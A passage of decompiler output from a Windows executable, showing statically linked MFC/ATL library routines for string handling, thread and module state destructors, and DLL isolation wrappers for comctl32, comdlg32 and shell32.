  *(int *)(iVar4 + 4) = iVar2;
  FUN_0040ae6f((int **)(pwVar1 + -8));
  *(wchar_t **)this = (wchar_t *)(iVar4 + 0x10);
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::Reallocate(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall ATL::CSimpleStringT<char,0>::Reallocate(CSimpleStringT<char,0> *this,int param_1)

{
  int **ppiVar1;
  int iVar2;
  
  ppiVar1 = (int **)(*(int *)this + -0x10);
  if ((*(int *)(*(int *)this + -8) < param_1) && (0 < param_1)) {
    iVar2 = (**(code **)(**ppiVar1 + 8))(ppiVar1,param_1,2);
    if (iVar2 != 0) goto LAB_0040b01b;
  }
  iVar2 = FUN_0040aee1();
LAB_0040b01b:
  *(int *)this = iVar2 + 0x10;
  return;
}



void __fastcall FUN_0040b025(undefined4 *param_1)

{
  *param_1 = _AFX_THREAD_STATE::vftable;
  param_1[0xd] = 0;
  param_1[0x15] = 0;
  param_1[0x13] = 0;
  param_1[0x14] = 0;
  return;
}



// Library Function - Single Match
//  public: virtual __thiscall _AFX_THREAD_STATE::~_AFX_THREAD_STATE(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall _AFX_THREAD_STATE::~_AFX_THREAD_STATE(_AFX_THREAD_STATE *this)

{
  *(undefined ***)this = vftable;
  if (*(HHOOK *)(this + 0x2c) != (HHOOK)0x0) {
    UnhookWindowsHookEx(*(HHOOK *)(this + 0x2c));
  }
  if (*(HHOOK *)(this + 0x28) != (HHOOK)0x0) {
    UnhookWindowsHookEx(*(HHOOK *)(this + 0x28));
  }
  if (*(void **)(this + 0xc) != (void *)0x0) {
    _free(*(void **)(this + 0xc));
  }
  return;
}



// Library Function - Single Match
//  public: virtual __thiscall AFX_MODULE_THREAD_STATE::~AFX_MODULE_THREAD_STATE(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall AFX_MODULE_THREAD_STATE::~AFX_MODULE_THREAD_STATE(AFX_MODULE_THREAD_STATE *this)

{
  void *pvVar1;
  int iVar2;
  
  *(undefined ***)this = vftable;
  if (*(int **)(this + 0x3c) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x3c) + 0x144))();
  }
  FUN_0040a3fc(*(void **)(this + 0x48));
  if (*(undefined4 **)(this + 0x14) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(this + 0x14))(1);
  }
  if (*(undefined4 **)(this + 0x18) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(this + 0x18))(1);
  }
  if (*(undefined4 **)(this + 0x1c) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(this + 0x1c))(1);
  }
  if (*(undefined4 **)(this + 0x20) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(this + 0x20))(1);
  }
  if (*(undefined4 **)(this + 0x24) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(this + 0x24))(1);
  }
  iVar2 = *(int *)(this + 0x38);
  if (iVar2 != 0) {
    while (*(int *)(iVar2 + 0xc) != 0) {
      pvVar1 = CPtrList::RemoveHead(*(CPtrList **)(this + 0x38));
      FUN_0040a3fc(pvVar1);
      iVar2 = *(int *)(this + 0x38);
    }
  }
  if (*(int **)(this + 0x30) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x30) + 4))(1);
  }
  if (*(int **)(this + 0x34) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x34) + 4))(1);
  }
  if (*(int **)(this + 0x38) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x38) + 4))(1);
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>(struct ATL::IAtlStringMgr
// *)
//  public: __thiscall ATL::CSimpleStringT<wchar_t,0>::CSimpleStringT<wchar_t,0>(struct
// ATL::IAtlStringMgr *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int * __thiscall CSimpleStringT<>(void *this,int *param_1)

{
  int iVar1;
  int *extraout_ECX;
  
  if (param_1 == (int *)0x0) {
    FUN_0040a834(-0x7fffbffb);
    param_1 = extraout_ECX;
  }
  iVar1 = (**(code **)(*param_1 + 0xc))();
  *(int *)this = iVar1 + 0x10;
  return (int *)this;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>(class
// ATL::CSimpleStringT<char,0> const &)
//  public: __thiscall ATL::CSimpleStringT<wchar_t,0>::CSimpleStringT<wchar_t,0>(class
// ATL::CSimpleStringT<wchar_t,0> const &)
// 
// Library: Visual Studio 2008 Release

CStringData ** __thiscall CSimpleStringT<>(void *this,int *param_1)

{
  CStringData *pCVar1;
  
  pCVar1 = ATL::CSimpleStringT<wchar_t,0>::CloneData((CStringData *)(*param_1 + -0x10));
  *(CStringData **)this = pCVar1 + 0x10;
  return (CStringData **)this;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall ATL::CSimpleStringT<char,0>::Empty(void)
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::Empty(void)
// 
// Library: Visual Studio 2008 Release

void __fastcall Empty(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  piVar1 = *(int **)(iVar2 + -0x10);
  if (*(int *)(iVar2 + -0xc) != 0) {
    if (*(int *)(iVar2 + -4) < 0) {
      ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT<wchar_t,0> *)param_1,0);
    }
    else {
      FUN_0040ae6f((int **)(iVar2 + -0x10));
      iVar2 = (**(code **)(*piVar1 + 0xc))();
      *param_1 = iVar2 + 0x10;
    }
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite2(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite2(CSimpleStringT<char,0> *this,int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)this;
  if (param_1 < *(int *)(iVar1 + -0xc)) {
    param_1 = *(int *)(iVar1 + -0xc);
  }
  if (*(int *)(iVar1 + -4) < 2) {
    iVar1 = *(int *)(iVar1 + -8);
    if (iVar1 < param_1) {
      if (iVar1 < 0x401) {
        iVar1 = iVar1 * 2;
      }
      else {
        iVar1 = iVar1 + 0x400;
      }
      if (iVar1 < param_1) {
        iVar1 = param_1;
      }
      Reallocate(this,iVar1);
    }
  }
  else {
    Fork(this,param_1);
  }
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall _AFX_THREAD_STATE::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __thiscall
_AFX_THREAD_STATE::_scalar_deleting_destructor_(_AFX_THREAD_STATE *this,uint param_1)

{
  ~_AFX_THREAD_STATE(this);
  if ((param_1 & 1) != 0) {
    CNoTrackObject::operator_delete(this);
  }
  return this;
}



// Library Function - Single Match
//  public: virtual void * __thiscall AFX_MODULE_THREAD_STATE::`scalar deleting destructor'(unsigned
// int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __thiscall
AFX_MODULE_THREAD_STATE::_scalar_deleting_destructor_(AFX_MODULE_THREAD_STATE *this,uint param_1)

{
  ~AFX_MODULE_THREAD_STATE(this);
  if ((param_1 & 1) != 0) {
    CNoTrackObject::operator_delete(this);
  }
  return this;
}



void * __fastcall FUN_0040b274(void *param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_0040c429();
  CSimpleStringT<>(param_1,piVar1);
  return param_1;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> >
// >::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> > >(class
// ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> > > const &)
//  public: __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >(class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > > const &)
// 
// Library: Visual Studio 2008 Release

void * __thiscall CStringT<>(void *this,int *param_1)

{
  CSimpleStringT<>(this,param_1);
  return this;
}



void __fastcall FUN_0040b2a1(int *param_1)

{
  FUN_0040ae6f((int **)(*param_1 + -0x10));
  return;
}



// Library Function - Single Match
//  private: char * __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite(int)
// 
// Library: Visual Studio 2008 Release

char * __thiscall
ATL::CSimpleStringT<char,0>::PrepareWrite(CSimpleStringT<char,0> *this,int param_1)

{
  if ((int)(1U - *(int *)(*(int *)this + -4) | *(int *)(*(int *)this + -8) - param_1) < 0) {
    PrepareWrite2(this,param_1);
  }
  return *(char **)this;
}



// Library Function - Single Match
//  class _AFX_THREAD_STATE * __stdcall AfxGetThreadState(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_AFX_THREAD_STATE * AfxGetThreadState(void)

{
  _AFX_THREAD_STATE *p_Var1;
  
  p_Var1 = (_AFX_THREAD_STATE *)
           CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (p_Var1 == (_AFX_THREAD_STATE *)0x0) {
    AfxThrowNotSupportedException();
    return p_Var1;
  }
  return p_Var1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual __thiscall AFX_MODULE_STATE::~AFX_MODULE_STATE(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall AFX_MODULE_STATE::~AFX_MODULE_STATE(AFX_MODULE_STATE *this)

{
  void *pvVar1;
  
  *(undefined ***)this = vftable;
  if (*(undefined4 **)(this + 0x48) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(this + 0x48))(1);
  }
  if (*(int **)(this + 0x70) != (int *)0x0) {
    (**(code **)(**(int **)(this + 0x70) + 0xc))(this + 0x4c);
    if (*(int **)(this + 0x70) != (int *)0x0) {
      (**(code **)(**(int **)(this + 0x70) + 4))(1);
    }
  }
  if ((undefined4 *)**(int **)(this + 0x78) != (undefined4 *)0x0) {
    (***(code ***)(undefined4 *)**(int **)(this + 0x78))(1);
  }
  if (*(undefined4 **)(*(int *)(this + 0x78) + 4) != (undefined4 *)0x0) {
    (**(code **)**(undefined4 **)(*(int *)(this + 0x78) + 4))(1);
  }
  FUN_0040a3fc(*(void **)(this + 0x78));
  pvVar1 = *(void **)(this + 0x80);
  if ((pvVar1 != (void *)0x0) && (pvVar1 != (void *)0xffffffff)) {
    AfxReleaseActCtx(pvVar1);
    *(void **)(this + 0x80) = (void *)0xffffffff;
  }
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)(this + 0x74));
  FUN_0040ae6f((int **)(*(int *)(this + 0x34) + -0x10));
  return;
}



// Library Function - Single Match
//  public: class AFX_MODULE_THREAD_STATE * __thiscall CThreadLocal<class
// AFX_MODULE_THREAD_STATE>::GetData(void)
// 
// Library: Visual Studio 2008 Release

AFX_MODULE_THREAD_STATE * __thiscall
CThreadLocal<class_AFX_MODULE_THREAD_STATE>::GetData
          (CThreadLocal<class_AFX_MODULE_THREAD_STATE> *this)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  
  pAVar1 = (AFX_MODULE_THREAD_STATE *)
           CThreadLocalObject::GetData
                     ((CThreadLocalObject *)this,(_func_CNoTrackObject_ptr *)&LAB_0040b25f);
  if (pAVar1 == (AFX_MODULE_THREAD_STATE *)0x0) {
    AfxThrowNotSupportedException();
    return pAVar1;
  }
  return pAVar1;
}



// Library Function - Single Match
//  public: __thiscall CDllIsolationWrapperBase::CDllIsolationWrapperBase(class
// ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> > > const &)
// 
// Library: Visual Studio 2008 Release

CDllIsolationWrapperBase * __thiscall
CDllIsolationWrapperBase::CDllIsolationWrapperBase
          (CDllIsolationWrapperBase *this,
          CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *param_1)

{
  *(undefined ***)this = vftable;
  CStringT<>(this + 0xc,(int *)param_1);
  *(undefined4 *)(this + 4) = 0;
  this[8] = (CDllIsolationWrapperBase)0x0;
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall CDllIsolationWrapperBase::~CDllIsolationWrapperBase(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CDllIsolationWrapperBase::~CDllIsolationWrapperBase(CDllIsolationWrapperBase *this)

{
  *(undefined ***)this = vftable;
  if (this[8] != (CDllIsolationWrapperBase)0x0) {
    FreeLibrary(*(HMODULE *)(this + 4));
  }
  FUN_0040ae6f((int **)(*(int *)(this + 0xc) + -0x10));
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: int __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::LoadStringA(struct HINSTANCE__ *,unsigned int)
//  public: int __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::LoadStringW(struct HINSTANCE__ *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int FID_conflict_LoadStringW(HINSTANCE hInstance,UINT uID,LPWSTR lpBuffer,int cchBufferMax)

{
  ushort *puVar1;
  wchar_t *pwVar2;
  CSimpleStringT<char,0> *in_ECX;
  uint uVar3;
  
  puVar1 = (ushort *)ATL::AtlGetStringResourceImage(hInstance,uID);
  if (puVar1 != (ushort *)0x0) {
    uVar3 = (uint)*puVar1;
    pwVar2 = (wchar_t *)ATL::CSimpleStringT<char,0>::PrepareWrite(in_ECX,uVar3);
    ATL::ChTraitsCRT<wchar_t>::ConvertToBaseType(pwVar2,uVar3,(wchar_t *)(puVar1 + 1),(uint)*puVar1)
    ;
    ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT<wchar_t,0> *)in_ECX,uVar3);
    puVar1 = (ushort *)0x1;
  }
  return (int)puVar1;
}



// Library Function - Single Match
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::SetString(wchar_t const *,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::SetString
          (CSimpleStringT<wchar_t,0> *this,wchar_t *param_1,int param_2)

{
  uint uVar1;
  wchar_t *pwVar2;
  CSimpleStringT<char,0> *extraout_ECX;
  CSimpleStringT<char,0> *this_00;
  uint uVar3;
  
  if (param_2 == 0) {
    Empty((int *)this);
  }
  else {
    this_00 = (CSimpleStringT<char,0> *)this;
    if (param_1 == (wchar_t *)0x0) {
      FUN_0040a834(-0x7ff8ffa9);
      this_00 = extraout_ECX;
    }
    uVar1 = *(uint *)(*(int *)this + -0xc);
    uVar3 = (int)param_1 - *(int *)this >> 1;
    pwVar2 = (wchar_t *)CSimpleStringT<char,0>::PrepareWrite(this_00,param_2);
    if (uVar1 < uVar3) {
      CopyCharsOverlapped(pwVar2,*(uint *)(*(int *)this + -8),param_1,param_2);
    }
    else {
      CopyCharsOverlapped(pwVar2,*(uint *)(*(int *)this + -8),pwVar2 + uVar3,param_2);
    }
    SetLength(this,param_2);
  }
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: virtual void * __thiscall AFX_MODULE_STATE::`scalar deleting destructor'(unsigned int)
//  public: virtual void * __thiscall _AFX_BASE_MODULE_STATE::`scalar deleting destructor'(unsigned
// int)
//  public: virtual void * __thiscall _AFX_DLL_MODULE_STATE::`scalar deleting destructor'(unsigned
// int)
// 
// Library: Visual Studio 2008 Release

AFX_MODULE_STATE * __thiscall FID_conflict__scalar_deleting_destructor_(void *this,byte param_1)

{
  AFX_MODULE_STATE::~AFX_MODULE_STATE((AFX_MODULE_STATE *)this);
  if ((param_1 & 1) != 0) {
    CNoTrackObject::operator_delete(this);
  }
  return (AFX_MODULE_STATE *)this;
}



// Library Function - Single Match
//  public: int __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::LoadStringW(unsigned int)
// 
// Library: Visual Studio 2008 Release

int __thiscall
ATL::CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>::LoadStringW
          (CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_> *this,
          uint param_1)

{
  HINSTANCE hInstance;
  int unaff_EBP;
  LPWSTR unaff_ESI;
  
  hInstance = (HINSTANCE)FUN_0040bed8();
  if (hInstance != (HINSTANCE)0x0) {
    hInstance = (HINSTANCE)FID_conflict_LoadStringW(hInstance,param_1,unaff_ESI,unaff_EBP);
  }
  return (int)hInstance;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char>
// > >::CheckImplicitLoad(void const *)
//  private: bool __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > >::CheckImplicitLoad(void const *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __thiscall CheckImplicitLoad(void *this,uint param_1)

{
  undefined4 uVar1;
  int iVar2;
  
  uVar1 = 0;
  if ((param_1 != 0) && ((param_1 & 0xffff0000) == 0)) {
    iVar2 = ATL::CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>::
            LoadStringW((CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>
                         *)this,param_1 & 0xffff);
    uVar1 = CONCAT31((int3)((uint)iVar2 >> 8),1);
  }
  return uVar1;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall ATL::CSimpleStringT<char,0>::Append(char const *)
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::Append(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void __thiscall Append(void *this,wchar_t *param_1)

{
  int iVar1;
  
  iVar1 = StringLength(param_1);
  ATL::CSimpleStringT<wchar_t,0>::SetString((CSimpleStringT<wchar_t,0> *)this,param_1,iVar1);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class ATL::CSimpleStringT<char,0> & __thiscall
// ATL::CSimpleStringT<char,0>::operator+=(char const *)
//  public: class ATL::CSimpleStringT<wchar_t,0> & __thiscall
// ATL::CSimpleStringT<wchar_t,0>::operator+=(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void * __thiscall FID_conflict_operator__(void *this,wchar_t *param_1)

{
  Append(this,param_1);
  return this;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> > > &
// __thiscall ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> >
// >::operator=(char const *)
//  public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> >
// > & __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> >
// >::operator=(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void * __thiscall FID_conflict_operator_(void *this,wchar_t *param_1)

{
  FID_conflict_operator__(this,param_1);
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: __thiscall ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> >
// >::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> > >(char const *)
// 
// Library: Visual Studio 2008 Release

CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> * __thiscall
ATL::CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>::
CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>
          (CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *this,char *param_1
          )

{
  int *piVar1;
  undefined4 uVar2;
  
  piVar1 = (int *)FUN_0040c429();
  CSimpleStringT<>(this,piVar1);
  uVar2 = CheckImplicitLoad(this,(uint)param_1);
  if ((char)uVar2 == '\0') {
    FID_conflict_operator_(this,(wchar_t *)param_1);
  }
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: __thiscall CComCtlWrapper::CComCtlWrapper(void)
// 
// Library: Visual Studio 2008 Release

CComCtlWrapper * __thiscall CComCtlWrapper::CComCtlWrapper(CComCtlWrapper *this)

{
  int local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 4;
  local_8 = 0x40b5be;
  ATL::CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>::
  CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>
            ((CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *)local_14,
             (char *)L"comctl32.dll");
  local_8 = 0;
  CDllIsolationWrapperBase::CDllIsolationWrapperBase
            ((CDllIsolationWrapperBase *)this,
             (CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *)local_14);
  FUN_0040ae6f((int **)(local_14[0] + -0x10));
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  *(undefined4 *)(this + 0x1c) = 0;
  *(undefined4 *)(this + 0x20) = 0;
  *(undefined4 *)(this + 0x24) = 0;
  *(undefined4 *)(this + 0x28) = 0;
  *(undefined4 *)(this + 0x2c) = 0;
  *(undefined4 *)(this + 0x30) = 0;
  *(undefined4 *)(this + 0x34) = 0;
  *(undefined4 *)(this + 0x38) = 0;
  *(undefined4 *)(this + 0x3c) = 0;
  *(undefined4 *)(this + 0x40) = 0;
  *(undefined4 *)(this + 0x44) = 0;
  *(undefined4 *)(this + 0x48) = 0;
  *(undefined4 *)(this + 0x4c) = 0;
  *(undefined4 *)(this + 0x50) = 0;
  *(undefined4 *)(this + 0x54) = 0;
  *(undefined4 *)(this + 0x58) = 0;
  *(undefined4 *)(this + 0x5c) = 0;
  *(undefined4 *)(this + 0x60) = 0;
  *(undefined4 *)(this + 100) = 0;
  *(undefined4 *)(this + 0x68) = 0;
  *(undefined4 *)(this + 0x6c) = 0;
  *(undefined4 *)(this + 0x70) = 0;
  *(undefined4 *)(this + 0x74) = 0;
  *(undefined4 *)(this + 0x78) = 0;
  *(undefined4 *)(this + 0x7c) = 0;
  *(undefined4 *)(this + 0x80) = 0;
  *(undefined4 *)(this + 0x84) = 0;
  *(undefined4 *)(this + 0x88) = 0;
  *(undefined4 *)(this + 0x8c) = 0;
  *(undefined4 *)(this + 0x90) = 0;
  *(undefined4 *)(this + 0x94) = 0;
  *(undefined4 *)(this + 0x98) = 0;
  *(undefined4 *)(this + 0x9c) = 0;
  *(undefined4 *)(this + 0xa0) = 0;
  *(undefined4 *)(this + 0xa4) = 0;
  *(undefined4 *)(this + 0xa8) = 0;
  *(undefined4 *)(this + 0xac) = 0;
  *(undefined4 *)(this + 0xb0) = 0;
  *(undefined4 *)(this + 0xb4) = 0;
  *(undefined4 *)(this + 0xb8) = 0;
  *(undefined4 *)(this + 0xbc) = 0;
  *(undefined4 *)(this + 0xc0) = 0;
  *(undefined4 *)(this + 0xc4) = 0;
  *(undefined4 *)(this + 200) = 0;
  *(undefined4 *)(this + 0xcc) = 0;
  *(undefined4 *)(this + 0xd0) = 0;
  *(undefined4 *)(this + 0xd4) = 0;
  *(undefined4 *)(this + 0xd8) = 0;
  *(undefined4 *)(this + 0xdc) = 0;
  *(undefined4 *)(this + 0xe0) = 0;
  *(undefined4 *)(this + 0xe4) = 0;
  *(undefined4 *)(this + 0xe8) = 0;
  *(undefined4 *)(this + 0xec) = 0;
  *(undefined4 *)(this + 0xf0) = 0;
  *(undefined4 *)(this + 0xf4) = 0;
  *(undefined4 *)(this + 0xf8) = 0;
  *(undefined4 *)(this + 0xfc) = 0;
  *(undefined4 *)(this + 0x100) = 0;
  *(undefined4 *)(this + 0x104) = 0;
  *(undefined4 *)(this + 0x108) = 0;
  *(undefined4 *)(this + 0x10c) = 0;
  *(undefined4 *)(this + 0x110) = 0;
  *(undefined4 *)(this + 0x114) = 0;
  *(undefined4 *)(this + 0x118) = 0;
  *(undefined4 *)(this + 0x11c) = 0;
  *(undefined4 *)(this + 0x120) = 0;
  *(undefined4 *)(this + 0x124) = 0;
  *(undefined4 *)(this + 0x128) = 0;
  *(undefined4 *)(this + 300) = 0;
  *(undefined4 *)(this + 0x130) = 0;
  *(undefined4 *)(this + 0x134) = 0;
  *(undefined4 *)(this + 0x138) = 0;
  *(undefined4 *)(this + 0x13c) = 0;
  *(undefined4 *)(this + 0x140) = 0;
  *(undefined4 *)(this + 0x144) = 0;
  *(undefined4 *)(this + 0x148) = 0;
  *(undefined4 *)(this + 0x14c) = 0;
  *(undefined4 *)(this + 0x150) = 0;
  *(undefined4 *)(this + 0x154) = 0;
  *(undefined4 *)(this + 0x158) = 0;
  *(undefined4 *)(this + 0x15c) = 0;
  *(undefined4 *)(this + 0x160) = 0;
  *(undefined4 *)(this + 0x164) = 0;
  *(undefined4 *)(this + 0x168) = 0;
  *(undefined4 *)(this + 0x16c) = 0;
  *(undefined4 *)(this + 0x170) = 0;
  *(undefined4 *)(this + 0x174) = 0;
  *(undefined4 *)(this + 0x178) = 0;
  *(undefined4 *)(this + 0x17c) = 0;
  *(undefined4 *)(this + 0x180) = 0;
  *(undefined4 *)(this + 0x184) = 0;
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: __thiscall CCommDlgWrapper::CCommDlgWrapper(void)
// 
// Library: Visual Studio 2008 Release

CCommDlgWrapper * __thiscall CCommDlgWrapper::CCommDlgWrapper(CCommDlgWrapper *this)

{
  int local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 4;
  local_8 = 0x40b7e2;
  ATL::CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>::
  CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>
            ((CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *)local_14,
             (char *)L"comdlg32.dll");
  local_8 = 0;
  CDllIsolationWrapperBase::CDllIsolationWrapperBase
            ((CDllIsolationWrapperBase *)this,
             (CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *)local_14);
  FUN_0040ae6f((int **)(local_14[0] + -0x10));
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined4 *)(this + 0x14) = 0;
  *(undefined4 *)(this + 0x18) = 0;
  *(undefined4 *)(this + 0x1c) = 0;
  *(undefined4 *)(this + 0x20) = 0;
  *(undefined4 *)(this + 0x24) = 0;
  *(undefined4 *)(this + 0x28) = 0;
  *(undefined4 *)(this + 0x2c) = 0;
  *(undefined4 *)(this + 0x30) = 0;
  *(undefined4 *)(this + 0x34) = 0;
  *(undefined4 *)(this + 0x38) = 0;
  *(undefined4 *)(this + 0x3c) = 0;
  *(undefined4 *)(this + 0x40) = 0;
  *(undefined4 *)(this + 0x44) = 0;
  *(undefined4 *)(this + 0x48) = 0;
  *(undefined4 *)(this + 0x4c) = 0;
  *(undefined4 *)(this + 0x50) = 0;
  *(undefined4 *)(this + 0x54) = 0;
  *(undefined4 *)(this + 0x58) = 0;
  *(undefined4 *)(this + 0x5c) = 0;
  *(undefined4 *)(this + 0x60) = 0;
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: __thiscall CShellWrapper::CShellWrapper(void)
// 
// Library: Visual Studio 2008 Release

CShellWrapper * __thiscall CShellWrapper::CShellWrapper(CShellWrapper *this)

{
  int local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 4;
  local_8 = 0x40b865;
  ATL::CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>::
  CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_>
            ((CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *)local_14,
             (char *)L"shell32.dll");
  local_8 = 0;
  CDllIsolationWrapperBase::CDllIsolationWrapperBase
            ((CDllIsolationWrapperBase *)this,
             (CStringT<char,class_StrTraitMFC<char,class_ATL::ChTraitsCRT<char>_>_> *)local_14);
  FUN_0040ae6f((int **)(local_14[0] + -0x10));
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 0x10) = 0;
  return this;
}



// Library Function - Multiple Matches With Different Base Names
//  public: virtual void * __thiscall CComCtlWrapper::`scalar deleting destructor'(unsigned int)
